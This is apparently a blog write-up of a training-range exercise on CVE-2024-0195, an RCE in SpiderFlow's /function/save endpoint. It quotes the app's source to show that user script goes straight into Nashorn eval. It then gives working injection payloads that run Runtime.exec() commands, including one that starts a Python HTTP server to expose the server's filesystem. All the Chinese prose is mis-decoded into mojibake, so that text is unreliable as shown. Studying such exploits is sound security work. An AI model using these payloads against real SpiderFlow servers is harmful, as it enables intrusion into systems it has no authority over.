---
title: æ˜¥ç§‹äº‘é•œ CVE-2024-0195
tags: [penetration]
date: 2024-10-20 00:00:00
categories: [penetration]
excerpt: è¿œç¨‹ä»£ç æ‰§è¡ŒRCE

---

## CVE-2024-0195

https://yunjing.ichunqiu.com/cve/detail/1114

```
SpiderFlowæ˜¯æ–°ä¸€ä»£å¼€æºçˆ¬è™«å¹³å°ï¼Œä»¥å›¾å½¢åŒ–æ–¹å¼å®šä¹‰çˆ¬è™«æµç¨‹ï¼Œä¸å†™ä»£ç å³å¯å®Œæˆçˆ¬è™«ã€‚åŸºäºspringboot+layuiå¼€å‘çš„å‰åç«¯ä¸åˆ†ç¦»,ä¹Ÿå¯ä»¥è¿›è¡ŒäºŒæ¬¡å¼€å‘ã€‚è¯¥ç³»ç»Ÿ/function/saveæ¥å£å­˜åœ¨RCEæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„å‘½ä»¤è¿œæ§æœåŠ¡å™¨
```

æŒ‰ç…§ä»‹ç»è®¿é—®/function/saveç•Œé¢ï¼Œå‘ç°æ˜¯ä¸€è¿ä¸²çš„javaæŠ¥é”™

![](/img/pene/13.png)

åœ¨htmlä¸­å¯»æ‰¾ï¼Œè‡ªå®šä¹‰å‡½æ•°-æ·»åŠ å‡½æ•°è¿™é‡Œï¼Œä¼šå‘é€/function/saveè¿™ä¸ªè¯·æ±‚

```js
layui.form.on('submit(save)',function(){
    $.ajax({
        url : 'function/save',
        type : 'post',
        data : {
            id : fId,
            name : $("input[name=name]").val(),
            parameter : $("input[name=parameter]").val(),
            script : editor.getValue()
        },
        success : function(data){
            if(data){
                var message = data.replace(/\n/g,'<br>').replace(/ /g,'&nbsp;').replace(/\t/g,'&nbsp;&nbsp;&nbsp;&nbsp;');
                layui.layer.alert('<div style="font-weight: bold;font-family:Consolas;font-size:12px;">' + message + '</div>',{title : 'ä¿å­˜å‡ºé”™',area:['800px','400px']});
            }else{
                layui.layer.msg('ä¿å­˜æˆåŠŸ',{
                    time : 800
                },function(){
                    location.href = 'functions.html';
                })
            }
        },
        error : function(){
            layui.layer.msg('è¯·æ±‚å¤±è´¥');
        }
    })
    return false;
}
```

ä»jsä»£ç å¯çŸ¥ï¼Œpostè¿‡å»çš„ä¸‰ä¸ªå‚æ•°ï¼Œnameï¼Œparameterï¼Œscriptä¸‰ä¸ªå‚æ•°å°±æ˜¯æ·»åŠ å‡½æ•°è¿™ä¸ªç•Œé¢é‡Œè‡ªå®šä¹‰çš„ä¸‰ä¸ªå‚æ•°

ä½†æ˜¯ä¸çŸ¥é“è¿™äº›ä¸œè¥¿å‘è¿‡å»ä¼šè¢«å¦‚ä½•ä½¿ç”¨ï¼Œå¥½åœ¨è¿™ä¸ªSpiderFlowæ˜¯å¼€æºçš„ï¼Œå¹¶ä¸”åœæ›´å‰æœ€åä¸€ç‰ˆçš„ç‰ˆæœ¬å°±æ˜¯é¶æœºä½¿ç”¨çš„0.5.0ï¼šhttps://github.com/ssssssss-team/spider-flow

ç›´æ¥åœ¨åº“é‡Œsearchå“ªé‡Œå¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œåœ¨`FunctionController.java`é‡Œï¼š

```java
@RestController
@RequestMapping("/function")
public class FunctionController {
    @Autowired
    private FunctionService functionService;
    ...
    @RequestMapping("/save")
    public String save(Function function){
        return functionService.saveFunction(function);
    }
    ...
}
```

è¯´æ˜¯è¿™ä¸ªè¯·æ±‚ä¼šè°ƒç”¨saveFunctionå¤„ç†ï¼ˆFunctionå¯¹è±¡åŒ…å«ä¸Šä¼ çš„nameï¼Œparameterï¼Œscriptä¸‰ä¸ªå‚æ•°ï¼‰

```java
    public String saveFunction(Function entity) {
        try {
            ScriptManager.validScript(entity.getName(),
                                      entity.getParameter(),entity.getScript());
            super.saveOrUpdate(entity);
            init();
            return null;
        } catch (Exception e) {
            logger.error("ä¿å­˜è‡ªå®šä¹‰å‡½æ•°å‡ºé”™",e);
            return ExceptionUtils.getStackTrace(e);
        }
    }
```

validScriptï¼š

```java
public static void validScript(String functionName,String parameters,String script) throws Exception {
    new ScriptEngineManager().getEngineByName("nashorn").
            eval(concatScript(functionName,parameters,script));
}
```

é€šè¿‡evalå‡½æ•°ï¼ŒæŠŠä¸‰ä¸ªå‚æ•°é€šè¿‡concatScriptè¿æ¥æˆjsä»£ç ï¼Œç„¶åç”¨evalæ‰§è¡Œ

concatScriptä¼šè‡ªåŠ¨å°†scriptä½œä¸ºä¸€æ®µå‡½æ•°å†…çš„ä»£ç ï¼Œåœ¨å…¶å‰åæ·»åŠ {}

æ¯”å¦‚è¾“å…¥ä¸€ä¸ª}ï¼Œä¼šæŠ¥é”™ï¼š

![](/img/pene/14.png)

ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆæ‹¼æ¥çš„jsä»£ç çš„å½¢å¼ï¼Œè€Œå¦‚æœä»£ç æ”¾åœ¨å‡½æ•°é‡Œæ˜¯æ‰§è¡Œä¸äº†çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡`}{`æ¥æä¸€æ®µå‡½æ•°å¤–çš„ä»£ç 

```js
}Java.type('java.lang.Runtime').getRuntime().exec('ls');{
```

ç„¶åè¯•äº†ä¸€ä¸‹ï¼Œç›´æ¥ä¿å­˜æˆåŠŸï¼Œæ²¡æœ‰ä»»ä½•å›æ˜¾

ä»æœ€å‰é¢çš„jsä»£ç å¯ä»¥çœ‹åˆ°

```js
success : function(data){
    if(data){...
    }else{
        layui.layer.msg('ä¿å­˜æˆåŠŸ',{
            time : 800
        },function(){
            location.href = 'functions.html';
        })
    }
```

å¦‚æœä¿å­˜æˆåŠŸï¼Œæ˜¯ä¸ä¼šä¼ å›æ¥ä»»ä½•dataçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è™½ç„¶æœ‰äº†æ‰§è¡Œä»»æ„å‘½ä»¤çš„æƒé™ï¼Œä½†æ˜¯æ²¡æ³•å›æ˜¾

è¿™ç§æ—¶å€™æœ€åº”è¯¥æƒ³åˆ°çš„æ–¹æ³•ï¼Œå°±æ˜¯åå¼¹ä¸€ä¸ªshellåˆ°è‡ªå·±çš„æœºå™¨ä¸Šï¼Œè¿™ä¹Ÿæ˜¯ç½‘ä¸Šèƒ½æ‰¾åˆ°çš„é¢˜è§£å¤§å¤šæ•°çš„åšæ³•ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰å…¬ç½‘ipğŸ˜¶â€ğŸŒ«ï¸

> å…¬ç½‘ipæ¯”ç§Ÿä¸€ä¼šäº‘æœåŠ¡å™¨è´µå¤šäº†ğŸ˜¶â€ğŸŒ«ï¸

æœ€ç»ˆæ˜¯é€šè¿‡å¼€ä¸€ä¸ªpythonçš„httpæœåŠ¡ï¼Œç„¶åæ²¡æœ‰index.htmlæ—¶ï¼Œå°±ä¼šè‡ªåŠ¨æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿ

```js
}Java.type('java.lang.Runtime').getRuntime().exec('python3 -m http.server 80');{
```

ç«¯å£ä¼¼ä¹è¿˜é€‰ä¸äº†åˆ«çš„ï¼Œåº”è¯¥æ˜¯å…¶ä»–ç«¯å£ä¼šè¢«å±è”½ï¼Œ

![](/img/pene/15.png)